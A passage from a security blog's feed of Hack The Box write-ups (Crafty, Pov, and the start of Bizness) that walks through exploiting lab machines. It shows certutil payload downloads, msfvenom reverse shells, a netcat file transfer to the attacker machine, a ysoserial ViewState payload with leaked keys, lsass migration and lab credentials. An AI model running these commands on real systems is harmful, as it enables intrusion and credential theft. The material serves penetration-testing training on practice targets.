</code></pre><p>Then we start the log4j exploit from the <code>log4j-shell-poc</code> directory.</p>
<pre tabindex="0"><code>python3 poc.py --userip &lt;IP_ADDRESS&gt; --webport 80 --lport &lt;PORT_NUMBER&gt;
</code></pre><p><img src="/images/HTB-Crafty/crafty-exploit.png" alt="Log4j exploit launch"></p>
<p>From the <code>PyCraft</code> folder we run <code>start.py</code></p>
<pre tabindex="0"><code>python3 start.py
</code></pre><p>After the <code>Connected.</code> message appears in PyCraft. We copy the link provided on the line starting with <code>Send me:</code> in <code>log4j-shell-poc</code>, paste it in pyCraft then press <code>Enter</code> and we catch a shell on the listener.</p>
<p><img src="/images/HTB-Crafty/PyCraft-connection-link.png" alt="PyCraft"></p>
<blockquote>
<p>If PyCraft fails to connect to the server, resetting the box should solve the issue.</p>
</blockquote>
<p><img src="/images/HTB-Crafty/shell-minecraft.png" alt="svc_minecraft shell"></p>
<p>The user flag is on the user desktop.</p>
<p><img src="/images/HTB-Crafty/crafty-user-flag.png" alt="Crafty user flag"></p>
<h2 id="privilege-escaltion">Privilege Escaltion</h2>
<p>In <code>c:\Users\svc_minecraft\server\plugins\</code> we find an archive named <code>playercounter-1.0-SNAPSHOT.jar</code>.</p>
<p>To send that file to our local machine we use <code>nc.exe</code> (Netcat for Windows)</p>
<ol>
<li>Download <code>nc.exe</code> with</li>
</ol>
<pre tabindex="0"><code>wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
</code></pre><ol start="2">
<li>
<p>Move into the <code>netcat-1.11</code> directory created after the extraction</p>
</li>
<li>
<p>Start a web server with Python</p>
</li>
</ol>
<pre tabindex="0"><code>python3 -m http.server
</code></pre><ol start="4">
<li>We download <code>nc.exe</code> on the target</li>
</ol>
<pre tabindex="0"><code>certutil.exe -urlcache -split -f http://IP:PORT/nc.exe nc.exe
</code></pre><p><img src="/images/HTB-Crafty/nc.exe-ontarget.png" alt="netcat upload on target"></p>
<ol start="5">
<li>On our local machine we run</li>
</ol>
<pre tabindex="0"><code>nc -nlp 1235 &gt; playercounter-1.0-SNAPSHOT.jar
</code></pre><ol start="6">
<li>Finally, we send the archive to our Kali machine</li>
</ol>
<pre tabindex="0"><code>.\nc.exe 10.10.14.222 1235 &lt; c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
</code></pre><p><img src="/images/HTB-Crafty/archive-exfiltration.png" alt="Crafty archive exfiltration"></p>
<blockquote>
<p>Stop the listener to regain control of the terminal on the target system.</p>
</blockquote>
<p>After extracting the archive, we get <code>Playercounter.class</code> in <code>/htb/crafty/playercounter/</code>which we decompile with <a href="https://www.decompiler.com/" target="_blank" >decompiler.com</a>

.</p>
<blockquote>
<p>A <code>.class</code> file is a compiled Java bytecode file. When you compile a Java source code file (<code>.java</code>), the Java compiler (<code>javac</code>) translates the human-readable Java code into a platform-independent bytecode format. This bytecode is then stored in <code>.class</code> files. In our case <code>Playercounter.class</code> contains the compiled bytecode for the <code>Playercounter</code> Java class.</p>
</blockquote>
<p>We find what looks like some credential (<code>s67u84zKq8IXw</code>) used when connecting to a service on port 27015 (typically used by online games).</p>
<p><img src="/images/HTB-Crafty/playercount-file.png" alt="archive content credentials"></p>
<p>We have a tool called <a href="https://github.com/antonioCoco/RunasCs" target="_blank" >RunasCs</a>

 that enables us to execute processes with permissions different from our current user&rsquo;s. Our objective is to get an Administrator shell from the current user <code>svc_minecraft</code>.</p>
<p>Let&rsquo;s generate a payload with <code>msfvenom</code>.</p>
<p><strong>Example</strong></p>
<pre tabindex="0"><code>msfvenom -p windows/x64/shell_reverse_tcp lhost=&lt;YOUR IP ADDRESS&gt; lport=&lt;PORT NUMBER&gt; -f exe -a x64 --platform windows -o shell.exe
</code></pre><p><code>shell.exe</code> and <code>RunasCs.exe</code> are transferred to the target using the same method employed for <code>nc.exe</code>.</p>
<p><img src="/images/HTB-Crafty/files-on-target.png" alt="malicious file and runascs.exe on target"></p>
<p>We setup another listener on the port selected for the <code>msfvenom</code> payload.</p>
<pre tabindex="0"><code>rlwrap -cAr nc -lvp &lt;PORT_NUMBER&gt;
</code></pre><p>We then use <code>runasCs</code> in conjunction with the malicious file.</p>
<pre tabindex="0"><code>.\runasCs.exe administrator s67u84zKq8IXw shell.exe --bypass-uac
</code></pre><p>We get a connection on the listener, as <code>administrator</code>.</p>
<p><img src="/images/HTB-Crafty/admin-shell.png" alt="admin shell"></p>
<p>At <code>C:\Users\Administrator\Desktop</code> we find <code>root.txt</code>.</p>
<p><img src="/images/HTB-Crafty/root-flag.png" alt="root flag"></p>
<h2 id="closing-words">Closing Words</h2>
<p>Log4j is considered one of the most severe vulnerability because it allows attackers to easily take over vulnerable systems. It is very important to be able to recognize and test for those popular vulnerabilities. If you want to learn more about it, below are a video and an article detailing it:</p>
<ul>
<li><a href="https://www.youtube.com/watch?v=UhuL11JaECM&amp;ab_channel=IntotheShadows" target="_blank" >Apache Log4j: The Exploit that Almost Killed the Internet</a>

</li>
<li><a href="https://builtin.com/articles/log4j-vulerability-explained" target="_blank" >Log4J Vulnerability Explained: What It Is and How to Fix It</a>

</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>HTB: Pov</title>
            <link>https://scorpiosec.com/posts/2024/06/htb-pov/</link>
            <pubDate>Fri, 07 Jun 2024 12:42:21 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/06/htb-pov/</guid>
            <description>Platform: Hack The Box Link: Pov Level: Medium OS: Windows Pov starts with a basic static website. After some enumeration, we discover a subdomain leading to an ASP.NET website that turns out to be vulnerable to LFI. Leveraging this vulnerability, we are able to read a critical file exposing sensitive information that we use to exploit the ViewState mechanism of the website, granting us our initial foothold. After exploring the target system, we move laterally to another user after finding and revealing their credentials.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Pov" target="_blank" >Pov</a>

</li>
<li>Level: Medium</li>
<li>OS: Windows</li>
</ul>
<hr>
<p>Pov starts with a basic static website. After some enumeration, we discover a subdomain leading to an ASP.NET website that turns out to be vulnerable to LFI. Leveraging this vulnerability, we are able to read a critical file exposing sensitive information that we use to exploit the <code>ViewState</code> mechanism of the website, granting us our initial foothold. After exploring the target system, we move laterally to another user after finding and revealing their credentials. Finally, we get the root flag by abusing the <code>SeDebugPrivilege</code>.</p>
<p><strong>A Windows VM with Defender disabled will be needed to reproduce one of the step of the writeup.</strong></p>
<p>Target IP - <code>10.10.11.251</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Pov 10.10.11.251
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-23 14:41 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.251
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.055s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">999</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span>|_http-title: pov.htb
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.01 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<p>To make the enumeration easier we can add the target to our <code>/etc/hosts</code> file.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.251 pov.htb&#34; | sudo tee -a /etc/hosts
</code></pre><p>The scan finds only one open port (80) running <code>http</code>. Visiting <code>http://10.10.11.251/</code> we find a static website offering some security services but no apparent exploitation paths.</p>
<p><img src="/images/HTB-Pov/pov-website.png" alt="Pov website"></p>
<p>With ffuf we are able to identify a subdomain.</p>
<pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://pov.htb -H &#34;Host: FUZZ.pov.htb&#34; -ic -fs 12330
</code></pre><p><img src="/images/HTB-Pov/subdomain-pov.png" alt="Pov subdomain"></p>
<p><code>http://dev.pov.htb/</code> leads to a portfolio website, of a web developer proficient with JS, ASP.NET, and PHP.</p>
<p><img src="/images/HTB-Pov/portfolio-website.png" alt="Pov portfolio website"></p>
<p>We are able to download the his CV with the button. We can see that the <code>file</code> parameter is used and it references <code>cv.pdf</code>. We can try to use this for a LFI.</p>
<p><img src="/images/HTB-Pov/cv-download.png" alt="Pov CV download request"></p>
<p>On Windows the hosts file is located at: <code>C:\WINDOWS\system32\drivers\etc\hosts</code>.</p>
<p><img src="/images/HTB-Pov/LFI-hosts-file.png" alt="Pov LFI vulnerability"></p>
<p>We are actually able to read it! With the help of <code>Wappalyzer</code> we learn that the application is built with ASP.NET and some research tells us that <code>web.config</code> is the configuration file &ldquo;used to manage various settings that define a website&rdquo; in ASP.NET applications. <em>Read more about it <a href="https://www.c-sharpcorner.com/UploadFile/puranindia/Asp-Net-web-configuration-file/" target="_blank" >here</a>

</em>.</p>
<p><img src="/images/HTB-Pov/web-framework.png" alt="Pov wappalyzer info"></p>
<p><img src="/images/HTB-Pov/web-config.png" alt="ASP.NET Web config file"></p>
<p>We are able to successfully read the configuration file. by replacing the <code>file</code> value with <code>/web.config</code>.</p>
<p><img src="/images/HTB-Pov/web-config-file.png" alt="Web config file read"></p>
<p>Researching about <code>asp.net machine key exploitation</code> we find <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter" target="_blank" >this</a>

 HackTricks page explaining how to use a tool call <a href="https://github.com/pwntester/ysoserial.net" target="_blank" >ysoserial.net</a>

 to exploit <code>vIewState</code>.</p>
<p>Under <code>Testcase 1.5</code> we read that we have to provide two parameters <code>--apppath=&quot;/&quot;</code> and <code>--path=&quot;/hello.aspx&quot;</code>.</p>
<p>We also need our payload to be base64 encoded, which we get on <a href="https://www.revshells.com/" target="_blank" >revshells</a>

 using <code>PowerShell #3 (Base64)</code> reverse shell.</p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>This tool (<code>ysoserial</code>) is designed for Windows we use a Windows VM with Defender disabled because it flags the tool as malicious. After executing the command below we copy its output and paste it into the <code>ViewState</code> parameter.</p>
<p><strong>Command example</strong></p>
<pre tabindex="0"><code>.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &#34;&lt;INSERT_REVSHELL_HERE&gt;&#34; --path=&#34;/portfolio/default.aspx&#34; --apppath=&#34;/&#34; --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;
</code></pre><p><img src="/images/HTB-Pov/ViewState-payload.png" alt="ViewState Payload"></p>
<p>We setup our listener and send the request which should result in us catching a shell.</p>
<p><img src="/images/HTB-Pov/initial-foothold.png" alt="Initial Foothold"></p>
<p>This account cannot read the user flag but we find a file called <code>connection.xml</code> in <code>C:\Users\sfitz\Documents</code>. It has the credentials for the user <code>alaading</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&lt;Objs Version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.1.0.1&#34;</span> xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;Obj RefId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;TN RefId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
</span></span><span style="display:flex;"><span>      &lt;T&gt;System.Object&lt;/T&gt;
</span></span><span style="display:flex;"><span>    &lt;/TN&gt;
</span></span><span style="display:flex;"><span>    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
</span></span><span style="display:flex;"><span>    &lt;Props&gt;
</span></span><span style="display:flex;"><span>      &lt;S N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UserName&#34;</span>&gt;alaading&lt;/S&gt;
</span></span><span style="display:flex;"><span>      &lt;SS N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password&#34;</span>&gt;&lt;/SS&gt;
</span></span><span style="display:flex;"><span>    &lt;/Props&gt;
</span></span><span style="display:flex;"><span>  &lt;/Obj&gt;
</span></span><span style="display:flex;"><span>&lt;/Objs&gt;
</span></span></code></pre></div><p>We can see a password value but it is not hashed, rather it uses a Powershell module leveraging secure XML. <em>Read more about it <a href="https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx" target="_blank" >here</a>

</em>.</p>
<p>We can reveal the password with the commands below.</p>
<pre tabindex="0"><code>$cred = Import-CliXml C:\Users\sfitz\Documents\connection.xml

$cred.GetNetworkCredential() | fl
</code></pre><p><img src="/images/HTB-Pov/alaading-creds.png" alt="User alaading user"></p>
<h3 id="lateral-movement">Lateral Movement</h3>
<p>With the credentials we can now use <a href="https://github.com/antonioCoco/RunasCs" target="_blank" >RunasCs</a>

 to get to get a shell as the user <code>alaading</code>.</p>
<p>We send the tool on the target.</p>
<pre tabindex="0"><code>certutil -urlcache -f http://&lt;IP_address&gt;:&lt;PORT&gt;/RunasCs.exe runascs.exe
</code></pre><p><img src="/images/HTB-Pov/dl-runascs.png" alt="runascs download"></p>
<p>After running the command below, we get a shell.</p>
<pre tabindex="0"><code>.\runascs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r &lt;IP_address&gt;:&lt;PORT&gt;
</code></pre><p><img src="/images/HTB-Pov/alaading-shell.png" alt="alaading shell"></p>
<p>The user flag is available at <code>C:\Users\alaading\desktop\user.txt</code>.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>We saw that this user has the privilege <code>SeDebugPrivilege</code>. From <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege" target="_blank" >HackTricks</a>

, we read that &ldquo;This privilege permits the <strong>debug other processes</strong>, including to read and write in the memory. Various strategies for memory injection, capable of evading most antivirus and host intrusion prevention solutions, can be employed with this privilege.&rdquo;</p>
<p>We start by generating a payload with msfvenom.</p>
<pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP_address lport=PORT -f exe -a x64 --platform windows -o revshell.exe
</code></pre><p>We send the executable on the target.</p>
<pre tabindex="0"><code>certutil -urlcache -f http://&lt;IP_address&gt;:&lt;PORT&gt;/revshell.exe revshell.exe
</code></pre><p><img src="/images/HTB-Pov/revshell.png" alt="reverse shell file"></p>
<p>Then open Metasploit, run the <code>mutli/handler</code>, execute the <code>revshell.exe</code> file on the target and you will get a meterpreter session.</p>
<pre tabindex="0"><code>use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost &lt;IP_address&gt;
set lport &lt;PORT&gt;
run
</code></pre><p><img src="/images/HTB-Pov/meterpreter-session.png" alt="meterpreter session"></p>
<p>With the <code>ps</code> command we are able to see the processes running on the target and we notice <code>lsass.exe</code>. Since we have <code>SeDebugPrivilege</code> we can migrate to this process.</p>
<blockquote>
<p>lsass.exe is a Windows process that <strong>takes care of security policy for the OS</strong>.</p>
</blockquote>
<p><img src="/images/HTB-Pov/lsass-process.png" alt="lsass process"></p>
<p><img src="/images/HTB-Pov/process-migration.png" alt="process migration"></p>
<p>We use <code>shell</code> to spawn a <code>cmd</code> shell, we are now <code>nt authority\system</code> and the root flag is at <code>C:\Users\Administrator\Desktop\root.txt</code>.</p>
<p><img src="/images/HTB-Pov/root-flag.png" alt="Root flag"></p>
<p>A Windows VM is sometimes necessary to run some tools for penetration testing, I highly recommend <a href="https://github.com/mandiant/commando-vm" target="_blank" >CommandoVM</a>

 as it comes with many tools that are not included in Kali Linux. You can follow <a href="https://www.youtube.com/watch?v=nNMEhm8pvPM&amp;ab_channel=Lsecqt" target="_blank" >this video</a>

 for an installation tutorial. I hope this write up was useful to you!</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Bizness</title>
            <link>https://scorpiosec.com/posts/2024/05/htb-bizness/</link>
            <pubDate>Wed, 22 May 2024 21:18:09 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/05/htb-bizness/</guid>
            <description>Platform: Hack The Box Link: Bizness Level: Easy OS: Linux Bizness is showcasing a web application powered by Apache OFBiz. During our investigation of vulnerabilities in the software, we identify one that allows attackers to bypass authentication. Leveraging this exploit, we gain our initial foothold. Next, we stumble upon a directory for Apache Derby that containing numerous .dat files. Our task is to sift through these files. Using some command-line magic, we manage to retrieve a password hash.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Bizness" target="_blank" >Bizness</a>

</li>
<li>Level: Easy</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>Bizness is showcasing a web application powered by Apache OFBiz. During our investigation of vulnerabilities in the software, we identify one that allows attackers to bypass authentication. Leveraging this exploit, we gain our initial foothold. Next, we stumble upon a directory for Apache Derby that containing numerous .dat files. Our task is to sift through these files. Using some command-line magic, we manage to retrieve a password hash. Unfortunately, common cracking methods fail to break it. To escalate our privileges to root, we switch tactics. We create a script that encrypts each line of a wordlist and compare the resulting hashes to the one we have. Once we find a match, the root password is revealed.</p>
<p>Target IP - <code>10.10.11.252</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Bizness 10.10.11.252
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Nmap 7.94SVN scan initiated Mon Mar  <span style="color:#ae81ff">4</span> 14:20:48 <span style="color:#ae81ff">2024</span> as: nmap -sC -sV -oA nmap/Bizness 10.10.11.252
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.252
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.046s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp  open  http     nginx 1.18.0
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://bizness.htb/
</span></span><span style="display:flex;"><span>443/tcp open  ssl/http nginx 1.18.0
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| tls-nextprotoneg: 
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: organizationName<span style="color:#f92672">=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span style="color:#f92672">=</span>Some-State/countryName<span style="color:#f92672">=</span>UK
</span></span><span style="display:flex;"><span>| Not valid before: 2023-12-14T20:03:40
</span></span><span style="display:flex;"><span>|_Not valid after:  2328-11-10T20:03:40
</span></span><span style="display:flex;"><span>| tls-alpn: 
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://bizness.htb/
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span> at Mon Mar  <span style="color:#ae81ff">4</span> 14:21:07 <span style="color:#ae81ff">2024</span> -- <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 18.37 seconds
</span></span></code></pre></div><p>Our scan discovers three open ports:</p>
<ul>
<li>Port 22/tcp: running SSH (Secure Shell) service.</li>
<li>Port 80/tcp: running HTTP service with nginx 1.18.0.</li>
<li>Port 443/tcp: running SSL/HTTP (HTTPS) service with nginx 1.18.0.</li>
</ul>
<p>We also have a redirection to <code>bizness.htb</code>, which we add to our <code>/etc/hosts</code> file with <code>sudo echo &quot;10.10.11.252 bizness.htb&quot; | sudo tee -a /etc/hosts</code>.</p>
<h2 id="enumeration">Enumeration</h2>
<p>At <code>https://bizness.htb/</code> we find a website for a company providing different business services.</p>
<p><img src="/images/HTB-Bizness/bizness-website.png" alt="Bizness website"></p>
<p>At the end of the page we notice that the website is powered by <code>Apache OFBiz</code>.</p>
<p><img src="/images/HTB-Bizness/pwrd-Apache-OFBiz.png" alt="Footer info showing Apache OFBiz used"></p>
<p>The website doesn&rsquo;t offer any additional useful information so we move to directory bruteforcing.</p>
<p><img src="/images/HTB-Bizness/dirsearch1.png" alt="Dirsearch results"></p>
<p><img src="/images/HTB-Bizness/dirsearch2.png" alt="More dirsearch results"></p>
<p>We check <code>/control</code> and it is showing an error message.</p>
<p><img src="/images/HTB-Bizness/apache-OFBiz.png" alt="Apache OFBiz error message"></p>
<blockquote>
<p>Apache OFBiz is an open source enterprise resource planning system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.</p>
</blockquote>
<p>We then go to <code>/control/login</code> and I find a login page.</p>
<p><img src="/images/HTB-Bizness/apacheOFBiz-login.png" alt="Apache OFBiz login page"></p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>We don&rsquo;t have any credentials right now so we research <code>Apache OFBiz vulnerability</code> and find <code>CVE-2023-51467</code>.</p>
<p><img src="/images/HTB-Bizness/CVE-2023-51467.png" alt="CVE-2023-51467"></p>
<p>An exploit is available at this <a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/tree/master" target="_blank" >Github account</a>

. I verify that the target is indeed vulnerable wit the <code>xdetection</code> script.</p>
<p><img src="/images/HTB-Bizness/ApacheOFBiz-vulnerable.png" alt="CVE-2023-51467 test"></p>
<p>We setup a netcat listener and run the exploit script.</p>
<pre tabindex="0"><code>nc -lvnp 4444
</code></pre><p><img src="/images/HTB-Bizness/exploit-script-ApacheOFBiz.png" alt="Apache OFBiz exploitation"></p>
<p>On the listener we get a reverse shell!</p>
<p><img src="/images/HTB-Bizness/reverse-shell.png" alt="Reverse shell"></p>
<p>We can upgrade our shell.</p>
<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
</code></pre><p><img src="/images/HTB-Bizness/better-shell.png" alt="Reverse shell"></p>
<p>The user flag is found at <code>/home/ofbiz/user.txt</code>.</p>
<p><img src="/images/HTB-Bizness/user-flag.png" alt="User flag"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>After exploring the system we find a password hash at <code>/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml</code> but we are unable to crack it.</p>
<p>After more digging we find a directory called <code>derby</code>.</p>
<blockquote>
<p>Apache Derby is a relational database management system developed by the Apache Software Foundation that can be embedded in Java programs and used for online transaction processing.</p>
</blockquote>
<p>A file called <code>README_DO_NOT_TOUCH_FILES.txt</code> at <code>/opt/ofbiz/runtime/data/derby/ofbiz/seg0</code> confirmis that this is indeed the database folder.</p>
<p><img src="/images/HTB-Bizness/derby-db.png" alt="Apache derby database file"></p>
<p>The <code>seg0</code> directory contains a lot of <code>.dat</code> files.</p>
<p><img src="/images/HTB-Bizness/dat-files.png" alt=".dat files list"></p>
<p>To make searching through the content easier we put all the content into a single <code>.txt</code> file that I transfer on my local machine.</p>
<pre tabindex="0"><code>cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/* &gt; dat_files.txt
</code></pre><p>On our local machine we search through all of the <code>.dat</code> files with</p>
<pre tabindex="0"><code>strings dat_files.txt | grep SHA
</code></pre><p>A hash is found.</p>
<p><img src="/images/HTB-Bizness/hash1.png" alt="hash found"></p>
<pre tabindex="0"><code>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
</code></pre><p>In the same file we find a line with <code>admin</code> as the username hinting that this is the admin password hash. But we are unable to crack this one also. Currently we have two hashes but no way to crack them.</p>
<p><img src="/images/HTB-Bizness/login-admin.png" alt="admin username"></p>
<p>We can go another route, by encrypting each line of the <code>rockyou.txt</code> wordlist and comparing it to the last hash I found. The match will reveal the password.</p>
<blockquote>
<p>You can check the <a href="https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java" target="_blank" >source code</a>

 of Apache OFBiz to see how the hashes are generated.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PasswordEncryptor</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, hash_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SHA&#34;</span>, pbkdf2_iterations<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span>):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>hash_type <span style="color:#f92672">=</span> hash_type
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>pbkdf2_iterations <span style="color:#f92672">=</span> pbkdf2_iterations
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crypt_bytes</span>(self, salt, value):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> salt:
</span></span><span style="display:flex;"><span>            salt <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>))<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>        hash_obj <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>new(self<span style="color:#f92672">.</span>hash_type)
</span></span><span style="display:flex;"><span>        hash_obj<span style="color:#f92672">.</span>update(salt<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>        hash_obj<span style="color:#f92672">.</span>update(value)
</span></span><span style="display:flex;"><span>        hashed_bytes <span style="color:#f92672">=</span> hash_obj<span style="color:#f92672">.</span>digest()
